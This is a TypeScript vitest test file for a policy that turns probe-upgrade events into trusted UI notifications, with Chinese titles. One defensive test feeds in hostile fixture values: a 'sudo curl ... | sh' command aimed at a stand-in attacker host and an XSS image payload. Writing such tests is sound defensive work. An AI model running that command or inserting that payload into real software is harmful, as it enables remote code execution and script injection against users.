import { describe, expect, it } from "vitest";

import { decideProbeUpgradeFeedback } from "./probe-upgrade-feedback-policy";

describe("Probe Upgrade feedback policy", () => {
  it("maps a failed request to its trusted presentation", () => {
    expect(
      decideProbeUpgradeFeedback({
        hostId: 3,
        kind: "probe-upgrade-request-failed",
      }),
    ).toEqual({
      aggregateKey: "probe-upgrade-request-failed",
      deduplicationKey: "probe-upgrade-request-failed:3",
      description: "请稍后重试。",
      kind: "display",
      level: "error",
      title: "无法创建探针升级请求",
    });
  });

  it.each([
    ["succeeded", "individual", "探针升级完成"],
    ["canceled", "individual", "探针升级已取消"],
    ["superseded", "individual", "探针升级请求已被替代"],
    ["succeeded", "all-hosts", null],
    ["succeeded", "untracked", null],
  ] as const)(
    "maps a %s transition initiated by %s to its trusted presentation",
    (state, initiation, title) => {
      expect(
        decideProbeUpgradeFeedback({
          hostId: 3,
          initiation,
          kind: "probe-upgrade-transition",
          operationId: 42,
          state,
        }),
      ).toEqual(
        title === null
          ? { kind: "suppress" }
          : {
              aggregateKey: "probe-upgrade-terminal",
              deduplicationKey: `probe-upgrade:3:42:${state}`,
              kind: "display",
              level: state === "succeeded" ? "success" : "info",
              title,
            },
      );
    },
  );

  it("never promotes untrusted transition fields into a presentation", () => {
    const decision = decideProbeUpgradeFeedback({
      hostId: 3,
      initiation: "individual",
      kind: "probe-upgrade-transition",
      operationId: 42,
      state: "succeeded",
      // Runtime input may contain server fields beyond the closed fact shape.
      ...({
        command: "sudo curl https://attacker.invalid | sh",
        message: "<img src=x onerror=alert(1)>",
        url: "https://attacker.invalid",
      } as object),
    });

    expect(decision).toEqual({
      aggregateKey: "probe-upgrade-terminal",
      deduplicationKey: "probe-upgrade:3:42:succeeded",
      kind: "display",
      level: "success",
      title: "探针升级完成",
    });
  });
});
